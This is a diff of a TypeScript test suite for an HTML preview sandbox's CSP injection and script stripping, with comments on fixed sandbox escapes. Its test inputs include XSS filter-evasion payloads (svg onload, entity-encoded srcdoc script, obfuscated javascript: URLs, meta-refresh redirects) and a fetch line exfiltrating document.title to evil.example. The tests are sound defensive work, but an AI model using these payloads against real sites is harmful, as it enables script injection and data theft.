@@ -1,5 +1,6 @@
 import {
   CHART_PREVIEW_CSP,
+  HTML_EXPORT_CSP,
   PDF_PREVIEW_CSP,
   PREVIEW_CSP,
   PREVIEW_CSP_INLINE,
@@ -7,8 +8,8 @@ import {
   PREVIEW_VIEWPORT,
   injectPreviewCsp,
   prepareHtmlRunDocument,
-  stripScripts,
 } from "@/lib/previewSandbox";
+import { stripScripts } from "@/lib/htmlScriptStrip";
 
 /** The CSP meta prepareHtmlRunDocument writes: the one pragma the Run tab keeps. */
 const RUN_CSP_TAG = `<meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP_LIVE}">`;
@@ -207,26 +208,36 @@ describe("CHART_PREVIEW_CSP", () => {
 });
 
 describe("injectPreviewCsp", () => {
-  it("injects the CSP meta right after an existing <head>", () => {
+  const meta = (csp: string = PREVIEW_CSP) =>
+    `<meta http-equiv="Content-Security-Policy" content="${csp}">`;
+
+  it("puts the CSP meta first, after the DOCTYPE, so it is the head's first child", () => {
     const html = "<!DOCTYPE html><html><head><title>x</title></head><body></body></html>";
-    const out = injectPreviewCsp(html);
-    expect(out).toContain(
-      `<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"><title>x</title></head>`,
+    expect(injectPreviewCsp(html)).toBe(
+      `<!DOCTYPE html>${meta()}<html><head><title>x</title></head><body></body></html>`,
     );
   });
 
-  it("injects a <head> with CSP after <html> when no head present", () => {
-    const html = "<!DOCTYPE html><html><body><p>hi</p></body></html>";
-    const out = injectPreviewCsp(html);
-    expect(out).toContain(
-      `<html><head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"></head><body>`,
+  it("does the same with no <head> tag, a lower-case DOCTYPE or whitespace before it", () => {
+    expect(injectPreviewCsp("<!DOCTYPE html><html><body><p>hi</p></body></html>")).toBe(
+      `<!DOCTYPE html>${meta()}<html><body><p>hi</p></body></html>`,
     );
+    expect(injectPreviewCsp("\n  <!doctype html>\n<html></html>")).toBe(
+      `\n  <!doctype html>${meta()}\n<html></html>`,
+    );
+  });
+
+  it("puts the CSP meta first in a document with no DOCTYPE", () => {
+    expect(injectPreviewCsp("<html><head></head><body></body></html>")).toBe(
+      `${meta()}<html><head></head><body></body></html>`,
+    );
+    // Not HTML whitespace before the DOCTYPE: the browser reads it as text, so it is not skipped.
+    expect(injectPreviewCsp("\u00A0<!DOCTYPE html><html></html>").startsWith(meta())).toBe(true);
   });
 
   it("wraps bare HTML into a document with the CSP", () => {
     const out = injectPreviewCsp("<p>hello</p>");
-    expect(out).toContain(`<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"></head>`);
-    expect(out).toContain("<p>hello</p>");
+    expect(out).toBe(`<!DOCTYPE html><html><head>${meta()}</head><body><p>hello</p></body></html>`);
   });
 
   it("only injects a single CSP meta (idempotent-ish for one pass)", () => {
@@ -236,136 +247,80 @@ describe("injectPreviewCsp", () => {
     expect(count).toBe(1);
   });
 
-  it("strips scripts that appear before <head> (meta CSP would not cover them)", () => {
+  // BUG FIX (A3): a <head> tag that comes after body content is ignored by the
+  // parser, which already closed an implied head; the meta used to be spliced
+  // after that tag, so it sat in <body>, where a browser ignores a CSP meta
+  // (HTML §4.2.5.3). The document ran with no policy at all.
+  it.each([
+    ["text", "<!DOCTYPE html><html>x<head><title>t</title></head><body></body></html>"],
+    ["a paragraph", "<!DOCTYPE html><html><p>x</p><head></head><body></body></html>"],
+    ["an image", "<!DOCTYPE html><html><img src=x><head></head><body></body></html>"],
+    ["a textarea", "<!DOCTYPE html><html><textarea>t</textarea><head></head><body></body></html>"],
+    ["a body tag", "<!DOCTYPE html><html><body></body><head></head></html>"],
+  ])("keeps the CSP in the head when %s comes before the <head> tag", (_what, html) => {
+    const out = injectPreviewCsp(html);
+    expect(out).toBe(`<!DOCTYPE html>${meta()}${html.slice("<!DOCTYPE html>".length)}`);
+  });
+
+  it("puts the CSP before scripts that appear before <head>, so they run under it", () => {
     const html =
       "<html><script>window.pwned=1</script><head><title>x</title></head><body></body></html>";
     const out = injectPreviewCsp(html);
-    expect(out).not.toContain("window.pwned");
-    expect(out).toContain(`content="${PREVIEW_CSP}"`);
+    expect(out.startsWith(meta())).toBe(true);
+    expect(out.indexOf(meta())).toBeLessThan(out.indexOf("window.pwned"));
   });
 
   // BUG FIX (was a confirmed sandbox escape): a decoy "<head" inside a
-  // <script> comment (or <style>/HTML comment/<textarea>/<title>) that
-  // appears before the real <head> used to fool the plain-text search into
+  // <script> comment (or <style>/HTML comment/<textarea>/<title>/an attribute)
+  // that appears before the real <head> used to fool the plain-text search into
   // splicing the CSP meta into that inert block instead — leaving the real
   // document with no CSP at all, and the attacker's script running with
-  // full network egress despite connect-src 'none'. Each case below is the
-  // exact confirmed PoC shape; the CSP must land inside the REAL <head>,
-  // and the decoy content must never be treated as if it were real markup.
-  it("is not fooled by a decoy <head> inside a <script> comment", () => {
-    const html =
-      '<!DOCTYPE html><html><script>\n// <head>\nfetch("https://evil.example/steal?x=" + document.title);\n</script>\n<head><title>Legit</title></head><body>Hello</body></html>';
-    const out = injectPreviewCsp(html);
-    // The CSP must be inside the real <head>, immediately before <title>.
-    expect(out).toContain(`<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"><title>Legit</title></head>`);
-    // The attacker's script must be gone entirely (it's "before head").
-    expect(out).not.toContain("evil.example");
-  });
-
-  it("is not fooled by a decoy <head> inside a <style> block", () => {
-    const html =
-      '<!DOCTYPE html><html><style>/* <head> */ body { color: red; }</style><head><title>Real</title></head><body></body></html>';
-    const out = injectPreviewCsp(html);
-    expect(out).toContain(`<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"><title>Real</title></head>`);
-  });
-
-  it("is not fooled by a decoy <head> inside an HTML comment", () => {
-    const html =
-      "<!DOCTYPE html><html><!-- <head> --><head><title>Real</title></head><body></body></html>";
-    const out = injectPreviewCsp(html);
-    expect(out).toContain(`<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"><title>Real</title></head>`);
-  });
-
-  it("is not fooled by a decoy <head> inside a <textarea>", () => {
-    const html =
-      "<!DOCTYPE html><html><textarea>sample: <head> tag</textarea><head><title>Real</title></head><body></body></html>";
-    const out = injectPreviewCsp(html);
-    expect(out).toContain(`<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"><title>Real</title></head>`);
+  // full network egress despite connect-src 'none'. Nothing is searched for
+  // now: the CSP is the first element, ahead of every decoy and script.
+  it.each([
+    [
+      "a <script> comment",
+      '<!DOCTYPE html><html><script>\n// <head>\nfetch("https://evil.example/steal?x=" + document.title);\n</script>\n<head><title>Legit</title></head><body>Hello</body></html>',
+    ],
+    [
+      "a <style> block",
+      "<!DOCTYPE html><html><style>/* <head> */ body { color: red; }</style><head><title>Real</title></head><body></body></html>",
+    ],
+    [
+      "an HTML comment",
+      "<!DOCTYPE html><html><!-- <head> --><head><title>Real</title></head><body></body></html>",
+    ],
+    [
+      "a <textarea>",
+      "<!DOCTYPE html><html><textarea>sample: <head> tag</textarea><head><title>Real</title></head><body></body></html>",
+    ],
+    [
+      "an attribute",
+      '<!DOCTYPE html><html title="<head>"><head><title>Real</title></head><body></body></html>',
+    ],
+  ])("is not fooled by a decoy <head> inside %s", (_where, html) => {
+    expect(injectPreviewCsp(html)).toBe(
+      `<!DOCTYPE html>${meta()}${html.slice("<!DOCTYPE html>".length)}`,
+    );
   });
 });
 
-describe("stripScripts", () => {
-  it("strips plain <script> tags and on*= handlers (baseline, unchanged)", () => {
-    const out = stripScripts('<script>alert(1)</script><div onclick="alert(2)">x</div>');
-    expect(out).not.toContain("<script>");
-    expect(out).not.toContain("alert(1)");
-    expect(out).not.toContain("onclick");
+describe("HTML_EXPORT_CSP", () => {
+  const directives = HTML_EXPORT_CSP.split(";").map((d) => d.trim());
+
+  it("is exactly the export policy: no script, inline styles, data/https images, no base or forms", () => {
+    expect(directives).toEqual([
+      "default-src 'none'",
+      "style-src 'unsafe-inline'",
+      "img-src data: https:",
+      "base-uri 'none'",
+      "form-action 'none'",
+    ]);
   });
 
-  // BUG FIX (was a confirmed bypass): "/" is a valid inter-attribute
-  // separator in HTML, not just whitespace, so <svg/onload=...> fires
-  // automatically on render — a well-known, real-world XSS-filter-evasion
-  // technique. The old regex required literal whitespace before "on\w+".
-  it("strips on*= handlers separated by '/' instead of whitespace", () => {
-    const out = stripScripts('<svg/onload=alert(document.domain)>');
-    expect(out).not.toContain("onload");
-    expect(out).not.toContain("alert(document.domain)");
-  });
-
-  // BUG FIX (was a confirmed bypass): browsers HTML-decode an iframe's
-  // srcdoc attribute before parsing it as the iframe's own document, so an
-  // entity-encoded <script> inside srcdoc executes on load with zero
-  // clicks. The old code only looked for the literal string "<script",
-  // never inside an attribute value.
-  it("strips iframe srcdoc containing an entity-encoded script", () => {
-    const out = stripScripts(
-      '<iframe srcdoc="&lt;script&gt;fetch(&#39;https://evil.example&#39;)&lt;/script&gt;"></iframe>',
-    );
-    expect(out).not.toContain("srcdoc");
-  });
-
-  it("strips javascript: URLs from href/src/action/formaction/data attributes", () => {
-    const cases = [
-      '<a href="javascript:alert(1)">click</a>',
-      "<a href='javascript:alert(1)'>click</a>",
-      '<img src="javascript:alert(1)">',
-      '<form action="javascript:alert(1)"><button formaction="javascript:alert(1)">go</button></form>',
-      '<object data="javascript:alert(1)"></object>',
-    ];
-    for (const html of cases) {
-      const out = stripScripts(html);
-      expect(out.toLowerCase()).not.toContain("javascript:");
-    }
-  });
-
-  it("strips javascript: URLs obfuscated with embedded whitespace/control characters", () => {
-    const out = stripScripts('<a href="java\tscript:alert(1)">click</a>');
-    expect(out.toLowerCase()).not.toContain("javascript:");
-  });
-
-  it("strips vbscript: URLs", () => {
-    const out = stripScripts('<a href="vbscript:msgbox(1)">click</a>');
-    expect(out.toLowerCase()).not.toContain("vbscript:");
-  });
-
-  it("disarms zero-click meta-refresh redirects", () => {
-    const out = stripScripts(
-      '<meta http-equiv="refresh" content="0;url=https://evil.example/phish">',
-    );
-    expect(pragmaNames(out)).toBe(0);
-  });
-
-  it("leaves ordinary safe links and images untouched", () => {
-    const out = stripScripts(
-      '<a href="https://example.com">link</a><img src="https://example.com/x.png"><img src="data:image/png;base64,AAAA">',
-    );
-    expect(out).toContain('href="https://example.com"');
-    expect(out).toContain('src="https://example.com/x.png"');
-    expect(out).toContain('src="data:image/png;base64,AAAA"');
-  });
-
-  it("strips data:text/html URLs while keeping data:image", () => {
-    const out = stripScripts(
-      '<a href="data:text/html,<script>alert(1)</script>">x</a><img src="data:image/png;base64,AAAA">',
-    );
-    expect(out.toLowerCase()).not.toContain("data:text/html");
-    expect(out).toContain('src="data:image/png;base64,AAAA"');
-  });
-
-  it("strips script end tags with junk before >", () => {
-    const out = stripScripts("<script>alert(1)</script\t\n bar><p>ok</p>");
-    expect(out.toLowerCase()).not.toContain("alert");
-    expect(out).toContain("<p>ok</p>");
+  it("never allows script, eval, connections or frames", () => {
+    expect(HTML_EXPORT_CSP).not.toMatch(/script-src|unsafe-eval|connect-src|frame-src|child-src/);
+    expect(HTML_EXPORT_CSP).not.toContain("http:");
   });
 });
 
@@ -428,7 +383,7 @@ describe("meta pragmas (A2)", () => {
         `<!DOCTYPE html><html><head>${meta}</head><body><p>ok</p>${meta}</body></html>`,
       );
       expect(pragmaNames(out)).toBe(1);
-      expect(out).toContain(`<head>${RUN_CSP_TAG}<script>(function () {`);
+      expect(out.startsWith(`<!DOCTYPE html>${RUN_CSP_TAG}<script>(function () {`)).toBe(true);
     });
 
     it("prepareHtmlRunDocument disarms it in a bare fragment", () => {
@@ -455,26 +410,29 @@ describe("meta pragmas (A2)", () => {
     expect(pragmaNames(out)).toBe(0);
   });
 
-  it("stripScripts disarms a pragma that its script filter pieces together", () => {
+  it("stripScripts pieces no meta together when it removes a script", () => {
+    // A removed script leaves a space (lib/htmlScriptStrip.ts), so "<me" and "ta"
+    // stay apart: an unknown <me> tag, never a <meta>.
     const out = stripScripts(`<me<script></script>ta http-equiv=refresh content="0;url=${EVIL}">`);
-    expect(pragmaNames(out)).toBe(0);
+    expect(out).toBe(`<me ta http-equiv=refresh content="0;url=${EVIL}">`);
+    expect(out).not.toMatch(/<meta/i);
   });
 
-  it("prepareHtmlRunDocument disarms a pragma pieced together before <head>", () => {
-    // Scripts before <head> are dropped (the CSP would not cover them), which
-    // joins "<me" and "ta ..." into a meta the old pre-pass never saw.
-    const out = prepareHtmlRunDocument(
-      `<html><me<script></script>ta http-equiv=refresh content="0;url=${EVIL}"><head></head><body></body></html>`,
-    );
-    expect(pragmaNames(out)).toBe(1);
-    expect(out).toContain(`<head>${RUN_CSP_TAG}<script>`);
+  it("prepareHtmlRunDocument removes nothing, so no pragma is pieced together", () => {
+    // The CSP goes first in the document (A3), so no script before <head> is
+    // dropped to keep it covered, and "<me" and "ta ..." never join into a meta.
+    const html = `<html><me<script></script>ta http-equiv=refresh content="0;url=${EVIL}"><head></head><body></body></html>`;
+    const out = prepareHtmlRunDocument(html);
+    expect(out.startsWith(`${RUN_CSP_TAG}<script>(function () {`)).toBe(true);
+    expect(out.endsWith(html)).toBe(true);
+    expect(out).not.toMatch(/<meta[\t\n\f\r /]+http-equiv=refresh/i);
   });
 
   it("puts the stay script after the real CSP, not a decoy in a comment", () => {
     const out = prepareHtmlRunDocument(
       '<html><!-- <meta http-equiv="Content-Security-Policy" content="x"> --><head></head><body></body></html>',
     );
-    expect(out).toContain(`<head>${RUN_CSP_TAG}<script>(function () {`);
+    expect(out.startsWith(`${RUN_CSP_TAG}<script>(function () {`)).toBe(true);
     expect(pragmaNames(out)).toBe(1);
   });
 
@@ -483,7 +441,7 @@ describe("meta pragmas (A2)", () => {
       `<html><!-- ${RUN_CSP_TAG} --><head></head><body></body></html>`,
     );
     expect(out).toContain(`<!-- ${RUN_CSP_TAG} -->`);
-    expect(out).toContain(`<head>${RUN_CSP_TAG}<script>(function () {`);
+    expect(out.startsWith(`${RUN_CSP_TAG}<script>(function () {`)).toBe(true);
   });
 
   it("stripScripts leaves ordinary metas and prose about http-equiv alone", () => {
